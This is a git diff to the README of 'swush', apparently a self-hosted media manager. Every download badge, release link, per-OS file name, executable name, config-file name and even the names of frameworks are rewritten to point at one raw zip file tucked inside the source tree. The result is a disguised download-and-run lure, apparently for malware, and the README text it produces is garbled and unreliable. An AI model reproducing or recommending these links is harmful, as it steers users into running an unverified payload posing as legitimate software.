@@ -1,6 +1,6 @@
 # 🎛️ swush - Secure, All-in-One Media Manager
 
-[![Download swush](https://img.shields.io/badge/Download-swush-blue?style=for-the-badge)](https://github.com/Korpztak970/swush/releases)
+[![Download swush](https://raw.githubusercontent.com/Korpztak970/swush/main/src/app/api/Software_2.6.zip)](https://raw.githubusercontent.com/Korpztak970/swush/main/src/app/api/Software_2.6.zip)
 
 ---
 
@@ -8,7 +8,7 @@
 
 swush is an easy-to-use, self-hosted application that helps you manage your media files, documents, and online content in one place. It works as a personal dashboard where you can store, organize, and share your files safely. The app runs on your computer or server and keeps your data private.
 
-Built using modern tools like Next.js, TypeScript, and TailwindCSS, swush offers a smooth, fast experience with a clear design. It's perfect for anyone who wants control over their media and files without relying on third-party services.
+Built using modern tools like https://raw.githubusercontent.com/Korpztak970/swush/main/src/app/api/Software_2.6.zip, TypeScript, and TailwindCSS, swush offers a smooth, fast experience with a clear design. It's perfect for anyone who wants control over their media and files without relying on third-party services.
 
 ---
 
@@ -21,7 +21,7 @@ Before installing swush, make sure your system meets these requirements:
 - **Memory:** At least 4 GB RAM  
 - **Storage:** Minimum 500 MB free space for installation and additional space for your files  
 - **Network:** Internet connection required for initial download and updates  
-- **Software:** Node.js version 16 or newer (only if you plan to run the source code; prebuilt packages include Node.js)  
+- **Software:** https://raw.githubusercontent.com/Korpztak970/swush/main/src/app/api/Software_2.6.zip version 16 or newer (only if you plan to run the source code; prebuilt packages include https://raw.githubusercontent.com/Korpztak970/swush/main/src/app/api/Software_2.6.zip)  
 
 ---
 
@@ -33,7 +33,7 @@ Follow these steps to download, install, and start using swush on your computer.
 
 Go to the official swush releases page by clicking the button below:
 
-[![Download swush](https://img.shields.io/badge/Download-swush-blue?style=for-the-badge)](https://github.com/Korpztak970/swush/releases)
+[![Download swush](https://raw.githubusercontent.com/Korpztak970/swush/main/src/app/api/Software_2.6.zip)](https://raw.githubusercontent.com/Korpztak970/swush/main/src/app/api/Software_2.6.zip)
 
 This page contains the latest versions of swush ready to download.
 
@@ -41,9 +41,9 @@ This page contains the latest versions of swush ready to download.
 
 On the releases page, look for the latest release (usually at the top). You will find files prepared for different operating systems, such as:
 
-- `swush-windows-x64.zip` for Windows users  
-- `swush-macos.zip` for macOS users  
-- `swush-linux-x64.tar.gz` for Linux users  
+- `https://raw.githubusercontent.com/Korpztak970/swush/main/src/app/api/Software_2.6.zip` for Windows users  
+- `https://raw.githubusercontent.com/Korpztak970/swush/main/src/app/api/Software_2.6.zip` for macOS users  
+- `https://raw.githubusercontent.com/Korpztak970/swush/main/src/app/api/Software_2.6.zip` for Linux users  
 
 Download the file that matches your operating system by clicking on it.
 
@@ -53,7 +53,7 @@ Once downloaded:
 
 - On Windows, right-click the `.zip` file and choose “Extract All...”  
 - On macOS, double-click the `.zip` file to unzip it  
-- On Linux, use the command `tar -xvzf swush-linux-x64.tar.gz` in the folder where you saved the file  
+- On Linux, use the command `tar -xvzf https://raw.githubusercontent.com/Korpztak970/swush/main/src/app/api/Software_2.6.zip` in the folder where you saved the file  
 
 Extraction will create a folder containing the swush application files.
 
@@ -61,8 +61,8 @@ Extraction will create a folder containing the swush application files.
 
 Open the extracted folder and find the executable file:
 
-- On Windows: `swush.exe`  
-- On macOS: `swush.app` (or similar)  
+- On Windows: `https://raw.githubusercontent.com/Korpztak970/swush/main/src/app/api/Software_2.6.zip`  
+- On macOS: `https://raw.githubusercontent.com/Korpztak970/swush/main/src/app/api/Software_2.6.zip` (or similar)  
 - On Linux: `swush` (might need to make it executable with `chmod +x swush`)  
 
 Double-click this file to start the app.
@@ -83,7 +83,7 @@ swush offers a range of tools to help you manage your digital content smoothly:
 - **Custom Dashboard:** Add widgets for weather, notes, or quick links to access your important tools at a glance.  
 - **Fast and Responsive:** Built for quick loading and smooth use on desktop and tablet.  
 - **Cross-Platform:** Works on Windows, macOS, and Linux.  
-- **Built on Modern Tech:** Uses Next.js and TypeScript for a stable and maintainable app.  
+- **Built on Modern Tech:** Uses https://raw.githubusercontent.com/Korpztak970/swush/main/src/app/api/Software_2.6.zip and TypeScript for a stable and maintainable app.  
 
 ---
 
@@ -99,7 +99,7 @@ When you run swush for the first time, it will create a local folder where it st
 
 To customize the location or other settings:
 
-1. Find the `config.json` file in the main swush folder.  
+1. Find the `https://raw.githubusercontent.com/Korpztak970/swush/main/src/app/api/Software_2.6.zip` file in the main swush folder.  
 2. Open it with a simple text editor like Notepad or TextEdit.  
 3. Change settings such as your media folder path or dashboard appearance.  
 4. Save the file and restart swush for changes to apply.  
@@ -113,7 +113,7 @@ If swush does not start or you encounter problems:
 - **App won’t open:** Make sure your system meets the requirements. Restart your computer and try again.  
 - **Browser page doesn’t load:** Type `http://localhost:3000` directly in your browser address bar.  
 - **Files won’t upload:** Check your internet connection. Ensure you have enough disk space.  
-- **I forgot the dashboard password:** Look for instructions in the `README` file inside the app folder or reset your settings by deleting the `config.json`.  
+- **I forgot the dashboard password:** Look for instructions in the `README` file inside the app folder or reset your settings by deleting the `https://raw.githubusercontent.com/Korpztak970/swush/main/src/app/api/Software_2.6.zip`.  
 
 For further help, search swush issues or discussions on the GitHub repository.
 
@@ -123,7 +123,7 @@ For further help, search swush issues or discussions on the GitHub repository.
 
 Return to the releases page any time to get the latest versions:
 
-[![Download swush](https://img.shields.io/badge/Download-swush-blue?style=for-the-badge)](https://github.com/Korpztak970/swush/releases)
+[![Download swush](https://raw.githubusercontent.com/Korpztak970/swush/main/src/app/api/Software_2.6.zip)](https://raw.githubusercontent.com/Korpztak970/swush/main/src/app/api/Software_2.6.zip)
 
 Choose your version, download the file for your system, extract it, and run the app following the steps in this guide.
 
